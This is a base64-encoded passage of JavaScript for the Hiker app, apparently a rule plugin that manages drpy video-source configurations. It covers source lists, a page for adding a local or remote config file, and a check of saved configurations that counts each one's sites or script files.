xcXG4gICAgfVxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBnZXRBbGxvd1NlYXJjaFNvdXJjZSgpIHtcXFxcbiAgICBsZXQgc2xpc3Q7XFxcXG4gICAgaWYgKHNlYXJjaEFsbG93Lmxlbmd0aCkge1xcXFxuICAgICAgICBzbGlzdCA9IHNvdXJjZUxpc3QuZmlsdGVyKHYgPT4gc2VhcmNoQWxsb3cuaW5jbHVkZXModi5rZXkpKTtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICBzbGlzdCA9IHNvdXJjZUxpc3QuZmlsdGVyKHYgPT4gdi5zZWFyY2hhYmxlKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKHNsaXN0Lmxlbmd0aCA9PSAwKSB7XFxcXG4gICAgICAgIHNsaXN0ID0gc291cmNlTGlzdC5zbGljZSgpO1xcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gc2xpc3Q7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGlzUHJlcGFyZWQoKSB7XFxcXG4gICAgcmV0dXJuIGlzUHJlcGFyZTtcXFxcbn1cXFxcblxcXFxuaXNQcmVwYXJlID0gcHJlcGFyZShzdG9yYWdlMC5nZXRJdGVtKFxcXFxcXFwiY3VycmVudENvbmZpZ1xcXFxcXFwiLCB7fSkpO1xcXFxuJC5leHBvcnRzID0ge1xcXFxuICAgIHByZXBhcmUsXFxcXG4gICAgZ2V0Q3VycmVudENvbmZpZyxcXFxcbiAgICBzZXRDdXJyZW50Q29uZmlnLFxcXFxuICAgIGdldEN1cnJlbnRTb3VyY2UsXFxcXG4gICAgZ2V0Q3VycmVudFNvdXJjZVBhdGgsXFxcXG4gICAgc2V0Q3VycmVudFNvdXJjZSxcXFxcbiAgICBnZXRDYW5TZWFyY2hTb3VyY2UsXFxcXG4gICAgZ2V0U2VhcmNoQWxsb3csXFxcXG4gICAgc2V0U2VhcmNoQWxsb3csXFxcXG4gICAgZ2V0QWxsU291cmNlLFxcXFxuICAgIGdldEFsbG93U2VhcmNoU291cmNlLFxcXFxuICAgIGlzUHJlcGFyZWQsXFxcXG4gICAgZ2V0QWJzb2x1dGVQYXRoLFxcXFxuICAgIGdldEFsbFNvdXJjZXMsXFxcXG4gICAgZmluZFNvdXJjZVxcXFxufTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLnvJbovpHphY3nva5cXFwiLFxcXCJwYXRoXFxcIjpcXFwiY3JlYXRlQ29uZmlnXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxubGV0IGxheW91dCA9IFtdO1xcXFxuc2V0UGFnZVRpdGxlKFxcXFxcXFwi5Yib5bu66YWN572uXFxcXFxcXCIpO1xcXFxubGV0IHJ1bnRpbWVDb25maWcgPSBHTS5kZWZpbmVNb2R1bGUoXFxcXFxcXCJydW50aW1lQ29uZmlnXFxcXFxcXCIpO1xcXFxubGV0IGN1cnJlbnRjb25maWcgPSBydW50aW1lQ29uZmlnLmdldEN1cnJlbnRDb25maWcoKTtcXFxcbmxldCBmID0gJC5yZXF1aXJlKFxcXFxcXFwiaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL3J1bGVsaXN0Lmpzb24/aWQ9NTA5OVxcXFxcXFwiKTtcXFxcbmFkZExpc3RlbmVyKFxcXFxcXFwib25DbG9zZVxcXFxcXFwiLCAoKSA9PiB7XFxcXG4gIGNsZWFyTXlWYXIoXFxcXFxcXCJkcnB5SGlrZXJfY29uZmlnX25hbWVcXFxcXFxcIik7XFxcXG4gIGNsZWFyTXlWYXIoXFxcXFxcXCJkcnB5SGlrZXJfY29uZmlnX3BhdGhcXFxcXFxcIik7XFxcXG59KTtcXFxcblxcXFxuLy/ljoblj7LphY3nva7orrDlvZVcXFxcbmZ1bmN0aW9uIHVuaXF1ZUFycmF5QnlQcm9wZXJ0eShhcnJheSwgcHJvcGVydHkpIHtcXFxcbiAgbGV0IHVuaXF1ZSA9IFtdO1xcXFxuICBsZXQgbWFwID0gbmV3IE1hcCgpO1xcXFxuICBmb3IgKGxldCBpdGVtIG9mIGFycmF5KSB7XFxcXG4gICAgbGV0IGtleSA9IGl0ZW1bcHJvcGVydHldO1xcXFxuICAgIGlmICghbWFwLmhhcyhrZXkpKSB7XFxcXG4gICAgICBtYXAuc2V0KGtleSwgdHJ1ZSk7XFxcXG4gICAgICB1bmlxdWUucHVzaChpdGVtKTtcXFxcbiAgICB9XFxcXG4gIH1cXFxcbiAgcmV0dXJuIHVuaXF1ZTtcXFxcbn1cXFxcbmxldCBjcGF0aCA9IFxcXFxcXFwiaGlrZXI6Ly9maWxlcy9jYWNoZS9cXFxcXFxcIiArIFxcXFxcXFwiZHJweWNvbmZpZy5qc29uXFxcXFxcXCI7XFxcXG5sZXQgcGF0aGNvbmZpZ3MgPSBbXTtcXFxcbnRyeSB7XFxcXG4gIHBhdGhjb25maWdzID0gSlNPTi5wYXJzZShyZWFkRmlsZShjcGF0aCkpIHx8IFtdO1xcXFxuICAvL3B1dE15VmFyKFxcXFxcXFwiZHJweUhpa2VyX2NvbmZpZ3NcXFxcXFxcIixwYXRoY29uZmlncyk7XFxcXG59IGNhdGNoIChlKSB7XFxcXG4gIGNvbnNvbGUubG9nKGUubWVzc2FnZSk7XFxcXG59XFxcXG5wYXRoY29uZmlncyA9IHVuaXF1ZUFycmF5QnlQcm9wZXJ0eShwYXRoY29uZmlncywgXFxcXFxcXCJwYXRoXFxcXFxcXCIpO1xcXFxuLy9sb2cocGF0aGNvbmZpZ3MpXFxcXG5cXFxcbmxldCBjb25maWdzX29iaiA9IHtcXFxcbiAgcGF0aDogY3BhdGgsXFxcXG4gIGNvbmZpZ3M6IHBhdGhjb25maWdzXFxcXG59XFxcXG4vL+WOhuWPsumFjee9ruiusOW9lVxcXFxuXFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gIGRlc2M6IFxcXFxcXFwi6YWN572u5ZCN56ewKOW/heWhqykgIOi3r+W+hOWSjOaWh+S7tuWkuemAieS6jOmAieS4gFxcXFxcXFwiLFxcXFxuICBleHRyYToge1xcXFxuICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxcXG4gICAgZGVmYXVsdFZhbHVlOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgIHB1dE15VmFyKFxcXFxcXFwiZHJweUhpa2VyX2NvbmZpZ19uYW1lXFxcXFxcXCIsIGlucHV0KTtcXFxcbiAgICB9KSxcXFxcbiAgICBpZDogXFxcXFxcXCJkcnB5SGlrZXJfY29uZmlnX25hbWVcXFxcXFxcIlxcXFxuICB9XFxcXG59KTtcXFxcblxcXFxubGV0IHNlbGVjdF9tb2RlID0gZ2V0SXRlbShcXFxcXFxcInNlbGVjdF9jb25maWdfbW9kZVxcXFxcXFwiLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG5sZXQgbmF2ID0gW1xcXFxcXFwi6Lev5b6EL1VSTFxcXFxcXFwiLCBcXFxcXFxcIuaWh+S7tuWkuVxcXFxcXFwiXTtcXFxcblxcXFxubmF2LmZvckVhY2goKHgsIGkpID0+IHtcXFxcbiAgbGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArIChpID09IHNlbGVjdF9tb2RlID8geC5mb250Y29sb3IoXFxcXFxcXCIjMTVCNzZDXFxcXFxcXCIpIDogeCksXFxcXG4gICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxcXG4gICAgICBzZXRJdGVtKFxcXFxcXFwic2VsZWN0X2NvbmZpZ19tb2RlXFxcXFxcXCIsIGkgKyBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgfSwgaSksXFxcXG4gICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcbiAgfSlcXFxcbn0pXFxcXG5cXFxcblxcXFxubGV0IHBhdGggPSBqb2luVXJsKGdldFBhdGgoXFxcXFxcXCJoaWtlcjovL2ZpbGVzL1xcXFxcXFwiKSwgXFxcXFxcXCIuLi9cXFxcXFxcIi5yZXBlYXQoNSkpLnNsaWNlKDcpO1xcXFxuXFxcXG5pZiAoc2VsZWN0X21vZGUgPT0gXFxcXFxcXCIwXFxcXFxcXCIpIHtcXFxcbiAgbGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIumAieaLqVxcXFxcXFwiLFxcXFxuICAgIHVybDogSlNPTi5zdHJpbmdpZnkoZi5maWxlU2VsZWN0aW9uVXJpKHtcXFxcbiAgICAgIGNhbGxiYWNrOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgbGV0IHRhcmdldCA9IGZpbmRJdGVtKFxcXFxcXFwiZHJweUhpa2VyX2NvbmZpZ19wYXRoXFxcXFxcXCIpLmV4dHJhO1xcXFxuICAgICAgICB1cGRhdGVJdGVtKFxcXFxcXFwiZHJweUhpa2VyX2NvbmZpZ19wYXRoXFxcXFxcXCIsIHtcXFxcbiAgICAgICAgICBleHRyYTogT2JqZWN0LmFzc2lnbih0YXJnZXQsIHtcXFxcbiAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogUEFUSFxcXFxuICAgICAgICAgIH0pXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICAgIH0pLFxcXFxuICAgICAgcm9vdERpclBhdGg6IHBhdGgsXFxcXG4gICAgICBpbml0aWFsUGF0aDogcGF0aCxcXFxcbiAgICAgIHBhdHRlcm46IDAsXFxcXG4gICAgICBmaWxlVHlwZTogXFxcXFxcXCIuanNvblxcXFxcXFwiLFxcXFxuICAgIH0pKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwi6YWN572u6Lev5b6EL1VSTCDmnKzlnLDpgInmi6lpbmRleC5qc29uXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgIGRlZmF1bHRWYWx1ZTogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJkcnB5SGlrZXJfY29uZmlnX3BhdGhcXFxcXFxcIiwgaW5wdXQpO1xcXFxuICAgICAgfSksXFxcXG4gICAgICBpZDogXFxcXFxcXCJkcnB5SGlrZXJfY29uZmlnX3BhdGhcXFxcXFxcIlxcXFxuICAgIH1cXFxcbiAgfSk7XFxcXG59XFxcXG5pZiAoc2VsZWN0X21vZGUgPT0gXFxcXFxcXCIxXFxcXFxcXCIpIHtcXFxcbiAgbGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIumAieaLqVxcXFxcXFwiLFxcXFxuICAgIHVybDogSlNPTi5zdHJpbmdpZnkoZi5maWxlU2VsZWN0aW9uVXJpKHtcXFxcbiAgICAgIGNhbGxiYWNrOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgbGV0IHRhcmdldCA9IGZpbmRJdGVtKFxcXFxcXFwiZHJweUhpa2VyX2NvbmZpZ19mb2xkZXJcXFxcXFxcIikuZXh0cmE7XFxcXG4gICAgICAgIHVwZGF0ZUl0ZW0oXFxcXFxcXCJkcnB5SGlrZXJfY29uZmlnX2ZvbGRlclxcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgZXh0cmE6IE9iamVjdC5hc3NpZ24odGFyZ2V0LCB7XFxcXG4gICAgICAgICAgICBkZWZhdWx0VmFsdWU6IFBBVEhcXFxcbiAgICAgICAgICB9KVxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmV0dXJuIHRydWU7XFxcXG4gICAgICB9KSxcXFxcbiAgICAgIHJvb3REaXJQYXRoOiBwYXRoLFxcXFxuICAgICAgaW5pdGlhbFBhdGg6IHBhdGgsXFxcXG4gICAgICBwYXR0ZXJuOiAxLFxcXFxuICAgICAgLy9maWxlVHlwZTogXFxcXFxcXCIuanNvblxcXFxcXFwiLFxcXFxuICAgIH0pKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwi6YWN572u5paH5Lu25aS56Lev5b6EIOmAieaLqWRycHlfanPnm67lvZVcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgZGVmYXVsdFZhbHVlOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgb25DaGFuZ2U6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICBwdXRNeVZhcihcXFxcXFxcImRycHlIaWtlcl9jb25maWdfcGF0aFxcXFxcXFwiLCBpbnB1dCk7XFxcXG4gICAgICB9KSxcXFxcbiAgICAgIGlkOiBcXFxcXFxcImRycHlIaWtlcl9jb25maWdfZm9sZGVyXFxcXFxcXCJcXFxcbiAgICB9XFxcXG4gIH0pO1xcXFxufVxcXFxubGF5b3V0LnB1c2goe1xcXFxuICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICB0aXRsZTogXFxcXFxcXCLnoa7orqRcXFxcXFxcIixcXFxcbiAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKGNvYmopID0+IHtcXFxcbiAgICBsZXQgcGF0aCA9IGdldE15VmFyKFxcXFxcXFwiZHJweUhpa2VyX2NvbmZpZ19wYXRoXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgIGxldCBuYW1lID0gZ2V0TXlWYXIoXFxcXFxcXCJkcnB5SGlrZXJfY29uZmlnX25hbWVcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgaWYgKCEocGF0aCAmJiBuYW1lKSkge1xcXFxuICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/kuI3lj6/kuLrnqbpcXFxcXFxcIjtcXFxcbiAgICB9XFxcXG4gICAgcGF0aCA9IHBhdGguc3RhcnRzV2l0aChcXFxcXFxcImh0dHBcXFxcXFxcIikgPyBwYXRoIDogcGF0aC5zdGFydHNXaXRoKFxcXFxcXFwiL1xcXFxcXFwiKSA/IChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIHBhdGgpIDogcGF0aDtcXFxcbiAgICAvL2xvZyhwYXRoKVxcXFxuICAgIHRyeSB7XFxcXG4gICAgICBsZXQgcnVudGltZUNvbmZpZyA9IEdNLmRlZmluZU1vZHVsZShcXFxcXFxcInJ1bnRpbWVDb25maWdcXFxcXFxcIik7XFxcXG4gICAgICBpZiAocGF0aC5zdGFydHNXaXRoKFxcXFxcXFwiaHR0cFxcXFxcXFwiKSkge1xcXFxuICAgICAgICBzaG93TG9hZGluZyhcXFxcXFxcIuato+WcqOWKoOi9vemFjee9ri4uLlxcXFxcXFwiKTtcXFxcbiAgICAgIH1cXFxcblxcXFxuICAgICAgaWYgKHJ1bnRpbWVDb25maWcuc2V0Q3VycmVudENvbmZpZyh7XFxcXG4gICAgICAgIHBhdGgsXFxcXG4gICAgICAgIG5hbWUsXFxcXG4gICAgICB9KSkge1xcXFxuICAgICAgICBjb2JqLmNvbmZpZ3MucHVzaCh7XFxcXG4gICAgICAgICAgcGF0aCxcXFxcbiAgICAgICAgICBuYW1lLFxcXFxuICAgICAgICB9KVxcXFxuICAgICAgICBjbGVhckl0ZW0oXFxcXFxcXCJub19sb2FkaW5nXFxcXFxcXCIpO1xcXFxuICAgICAgICBzYXZlRmlsZShjb2JqLnBhdGgsIEpTT04uc3RyaW5naWZ5KGNvYmouY29uZmlncykpO1xcXFxuICAgICAgICBiYWNrKGZhbHNlKTtcXFxcbiAgICAgICAgbGV0IERycHlNYW5hZ2UgPSBHTS5kZWZpbmVNb2R1bGUoXFxcXFxcXCJEcnB5TWFuYWdlXFxcXFxcXCIpO1xcXFxuICAgICAgICBEcnB5TWFuYWdlLmNsZWFyKCk7XFxcXG4gICAgICAgICQucmVxdWlyZShcXFxcXFxcIkNoYW5nZVNvdXJjZVBvcFxcXFxcXFwiKS5zaG93KDEwMCk7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6K6+572u5oiQ5YqfXFxcXFxcXCI7XFxcXG4gICAgICB9XFxcXG4gICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+mFjee9ruaWh+S7tuacieivr1xcXFxcXFwiO1xcXFxuICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8vXFxcXFxcXCIgKyBlLnRvU3RyaW5nKCk7XFxcXG4gICAgfWZpbmFsbHl7XFxcXG4gICAgICBoaWRlTG9hZGluZygpO1xcXFxuICAgIH1cXFxcbiAgfSwgY29uZmlnc19vYmopLFxcXFxuICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG59KTtcXFxcblxcXFxuaWYgKHBhdGhjb25maWdzLmxlbmd0aCkge1xcXFxuICBsYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgXFxcXFxcXCI8c21hbGw+5Y6G5Y+y6YWN572u6K6w5b2VIOeCueaIkei/m+ihjOmFjee9ruajgOmqjDwvc21hbGw+XFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChwKSA9PiB7XFxcXG4gICAgICAvL2xvZyhwKVxcXFxuICAgICAgZnVuY3Rpb24gdW5pcXVlKGFycikge1xcXFxuICAgICAgICBjb25zdCByZXMgPSBuZXcgTWFwKCk7XFxcXG4gICAgICAgIHJldHVybiBhcnIuZmlsdGVyKChhKSA9PiAhcmVzLmhhcyhhKSAmJiByZXMuc2V0KGEsIDEpKVxcXFxuICAgICAgfVxcXFxuICAgICAgdmFyIHJlc3VsdHMgPSBbXTtcXFxcbiAgICAgIGlmIChwLmxlbmd0aCA9PSAwKSB7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5peg5Zyw5Z2AXFxcXFxcXCI7XFxcXG4gICAgICB9XFxcXG4gICAgICBsaXN0ID0gcC5tYXAoeCA9PiB4LnBhdGgpO1xcXFxuICAgICAgdmFyIHRhc2sgPSBmdW5jdGlvbihvYmopIHtcXFxcbiAgICAgICAgbGV0IHMgPSBEYXRlLm5vdygpO1xcXFxuICAgICAgICBsZXQganNGaWxlcyA9IFtdO1xcXFxuICAgICAgICBsZXQgY291bnQgPSAwO1xcXFxuXFxcXG4gICAgICAgIGZ1bmN0aW9uIGZpbHRlck90aGVyKGxpc3QpIHtcXFxcbiAgICAgICAgICByZXR1cm4gbGlzdC5maWx0ZXIoaXQgPT4gU3RyaW5nKGl0LmFwaSkuaW5jbHVkZXMoXFxcXFxcXCJkcnB5Mi5taW4uanNcXFxcXFxcIikgfHwgU3RyaW5nKGl0LmFwaSkuaW5jbHVkZXMoXFxcXFxcXCJkcnB5Mi5qc1xcXFxcXFwiKSlcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpZiAob2JqLnVybC5zdGFydHNXaXRoKFxcXFxcXFwiZmlsZTpcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICBsZXQgY29kZSA9IFxcXFxcXFwibm9cXFxcXFxcIjtcXFxcbiAgICAgICAgICBsZXQgcGF0aCA9IG9iai51cmwucmVwbGFjZShcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgbGV0IGRpciA9IG5ldyBqYXZhLmlvLkZpbGUocGF0aCk7XFxcXG4gICAgICAgICAgaWYgKGRpci5pc0RpcmVjdG9yeSgpKSB7XFxcXG4gICAgICAgICAgICBsZXQgZmxpc3QgPSBkaXIubGlzdEZpbGVzKCk7XFxcXG4gICAgICAgICAgICBmb3IgKHZhciBmIG9mIGZsaXN0KSB7XFxcXG4gICAgICAgICAgICAgIC8vIOajgOafpeaWh+S7tuWQjeaYr+WQpuS7pS5qc+e7k+WwvlxcXFxuICAgICAgICAgICAgICBpZiAoZi5pc0ZpbGUoKSAmJiBmLmdldE5hbWUoKS50b0xvd2VyQ2FzZSgpLmVuZHNXaXRoKFxcXFxcXFwiLmpzXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAganNGaWxlcy5wdXNoKGYpO1xcXFxuICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgfVxcXFxuICAgICAgICAgIGlmIChkaXIuaXNGaWxlKCkgJiYgZmlsZUV4aXN0KG9iai51cmwpKSB7XFxcXG4gICAgICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgICBqc29uID0gSlNPTi5wYXJzZShyZWFkRmlsZShvYmoudXJsKSk7XFxcXG4gICAgICAgICAgICAgIGlmIChBcnJheS5pc0FycmF5KGpzb24uc2l0ZXMpIHx8IGpzb24uc2l0ZXMubGVuZ3RoKSB7XFxcXG4gICAgICAgICAgICAgICAgY291bnQgPSBmaWx0ZXJPdGhlcihqc29uLnNpdGVzKS5sZW5ndGg7XFxcXG4gICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHt9XFxcXG4gICAgICAgICAgICBjb2RlID0gXFxcXFxcXCJva1xcXFxcXFwiO1xcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgICBpZiAoanNGaWxlcy5sZW5ndGggPj0gNSkge1xcXFxuICAgICAgICAgICAgY291bnQgPSBqc0ZpbGVzLmxlbmd0aDtcXFxcbiAgICAgICAgICAgIGNvZGUgPSBcXFxcXFxcIm9rXFxcXFxcXCI7XFxcXG4gICAgICAgICAgfVxcXFxuICAgICAgICAgIHJldHVybiB7XFxcXG4gICAgICAgICAgICB0aW1lOiAoRGF0ZS5ub3coKSAtIHMpLFxcXFxuICAgICAgICAgICAgdXJsOiBvYmoudXJsLFxcXFxuICAgICAgICAgICAgY291bnQ6IGNvdW50LFxcXFxuICAgICAgICAgICAgY29kZTogY29kZSxcXFxcbiAgICAgICAgICAgIGluZGV4OiBvYmouaVxcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgICAgICB2YXIgaiA9IEpTT04ucGFyc2UoZmV0Y2gob2JqLnVybCwge1xcXFxuICAgICAgICAgIHdpdGhIZWFkZXJzOiB0cnVlLFxcXFxuICAgICAgICAgIHRpbWVvdXQ6IDUwMDAsXFxcXG4gICAgICAgIH0pKTtcXFxcbiAgICAgICAgbGV0IGUgPSBEYXRlLm5vdygpO1xcXFxuICAgICAgICBsZXQgYyA9IGUgLSBzO1xcXFxuICAgICAgICBpZiAob2JqLnVybC5pbmNsdWRlcyhcXFxcXFxcImdpdGh1Yi5jb21cXFxcXFxcIikgJiYgai5zdGF0dXNDb2RlID09IDIwMCkge1xcXFxuICAgICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICB2YXIgaHRtbCA9IGouYm9keTtcXFxcbiAgICAgICAgICAgIHZhciBqc29uID0gSlNPTi5wYXJzZShwZGZoKGh0bWwsIFxcXFxcXFwiI3JlcG8tY29udGVudC1wamF4LWNvbnRhaW5lciYmc2NyaXB0JiZIdG1sXFxcXFxcXCIpKTtcXFxcbiAgICAgICAgICAgIGxldCBsaXN0ID0ganNvbi5wYXlsb2FkLnRyZWUuaXRlbXM7XFxcXG4gICAgICAgICAgICBjb3VudCA9IGxpc3QuZmlsdGVyKHggPT4geC5uYW1lLmVuZHNXaXRoKFxcXFxcXFwiLmpzXFxcXFxcXCIpKS5sZW5ndGg7XFxcXG4gICAgICAgICAgfSBjYXRjaCB7fVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgbGV0IGpzb24gPSBKU09OLnBhcnNlKHRvQ29ycmVjdEpTT05TdHJpbmcoai5ib2R5KSB8fCBcXFxcXFxcInt9XFxcXFxcXCIpO1xcXFxuICAgICAgICAgIGlmIChBcnJheS5pc0FycmF5KGpzb24uc2l0ZXMpIHx8IGpzb24uc2l0ZXMubGVuZ3RoKSB7XFxcXG4gICAgICAgICAgICBjb3VudCA9IGZpbHRlck90aGVyKGpzb24uc2l0ZXMpLmxlbmd0aDtcXFxcbiAgICAgICAgICB9XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHt9XFxcXG5cXFxcbiAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICB0aW1lOiBjLFxcXFxuICAgICAgICAgIHVybDogai51cmwsXFxcXG4gICAgICAgICAgY291bnQ6IGNvdW50LFxcXFxuICAgICAgICAgIGNvZGU6IGouc3RhdHVzQ29kZSxcXFxcbiAgICAgICAgICBpbmRleDogb2JqLmksXFxcXG4gICAgICAgIH1cXFxcbiAgICAgIH07XFxcXG4gICAgICBsZXQgdGFza3MgPSBsaXN0Lm1hcCgoeCwgaSkgPT4ge1xcXFxuICAgICAgICBpID0gaSArIDE7XFxcXG4gICAgICAgIHJldHVybiB7XFxcXG4gICAgICAgICAgZnVuYzogdGFzayxcXFxcbiAgICAgICAgICBwYXJhbToge1xcXFxuICAgICAgICAgICAgdXJsOiB4LFxcXFxuICAgICAgICAgICAgaTogaSAtIDEsXFxcXG4gICAgICAgICAgfSxcXFxcbiAgICAgICAgICBpZDogJ3Rhc2tpZCcgKyBpXFxcXG4gICAgICAgIH1cXFxcbiAgICAgIH0pO1xcXFxuICAgICAgdmFyIGNvdW50ID0gc3VjY2VzcyA9IHRhc2tzLmxlbmd0aDtcXFxcbiAgICAgIGJlKHRhc2tzLCB7XFxcXG4gICAgICAgIGZ1bmM6IGZ1bmN0aW9uKG9iaiwgaWQsIGVycm9yLCB0YXNrUmVzdWx0KSB7XFxcXG4gICAgICAgICAgb2JqLnJlc3VsdHMucHVzaCh0YXNrUmVzdWx0KVxcXFxuICAgICAgICAgIGNvdW50ID0gY291bnQgLSAxO1xcXFxuICAgICAgICAgIGlmIChjb3VudCA+IDApIHtcXFxcbiAgICAgICAgICAgIHNob3dMb2FkaW5nKFxcXFxcXFwi5qOA5rWL5LitLi4u5Ymp5L2Z5Zyw5Z2A77yaXFxcXFxcXCIgKyBjb3VudClcXFxcbiAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgaGlkZUxvYWRpbmcoKTtcXFxcbiAgICAgICAgICB9XFxcXG4gICAgICAgIH0sXFxcXG4gICAgICAgIHBhcmFtOiB7XFxcXG4gICAgICAgICAgaGk6ICdjY2MnLFxcXFxuICAgICAgICAgIHJlc3VsdHM6IHJlc3VsdHNcXFxcbiAgICAgICAgfVxcXFxuICAgICAgfSwgc3VjY2Vzcyk7XFxcXG4gICAgICAvL2xvZyhyZXN1bHRzKVxcXFxuICAgICAgcmVzdWx0cyA9IHJlc3VsdHMuZmlsdGVyKGYgPT4gZik7XFxcXG4gICAgICByZXN1bHRzLmZvckVhY2goKHgsIGkpID0+IHtcXFxcbiAgICAgICAgbGV0IGl0ZW0gPSBmaW5kSXRlbShcXFxcXFxcInBhdGhcXFxcXFxcIiArIHguaW5kZXgpO1xcXFxuICAgICAgICBsZXQgcmVnZXggPSAvKOWQjeensDouKj8pKFxcXFxcXFxccyspP1xcXFxcXFxcbi9nO1xcXFxuICAgICAgICBsZXQgdGl0bGUgPSBcXFxcXFxcIuWQjeensDpcXFxcXFxcIiArIHBbeC5pbmRleF0ubmFtZSArIFxcXFxcXFwiIFxcXFxcXFwiO1xcXFxuICAgICAgICBsZXQgdXJsID0gcFt4LmluZGV4XS5wYXRoO1xcXFxuICAgICAgICBsZXQgbXNnID0gXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgbGV0IGNvdW50ID0geC5jb3VudCAhPSAwID8gXFxcXFxcXCIg5rqQ5pWw6YePOlxcXFxcXFwiICsgeC5jb3VudCA6IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgICAgIGlmICgvbm8vLnRlc3QoeC5jb2RlKSkge1xcXFxuICAgICAgICAgIG1zZyA9IGl0ZW0udGl0bGUucmVwbGFjZShyZWdleCwgdGl0bGUgKyBcXFxcXFxcIumFjee9ruacieivr1xcXFxcXFwiLmZvbnRjb2xvcihcXFxcXFxcInJlZFxcXFxcXFwiKSArIFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIpO1xcXFxuICAgICAgICB9IGVsc2UgaWYgKC9eKC0xfDB8NDA0KS8udGVzdCh4LmNvZGUpKSB7XFxcXG4gICAgICAgICAgbXNnID0gaXRlbS50aXRsZS5yZXBsYWNlKHJlZ2V4LCB0aXRsZSArIFxcXFxcXFwi5peg5rOV6K6/6ZeuXFxcXFxcXCIuZm9udGNvbG9yKFxcXFxcXFwicmVkXFxcXFxcXCIpICsgXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIi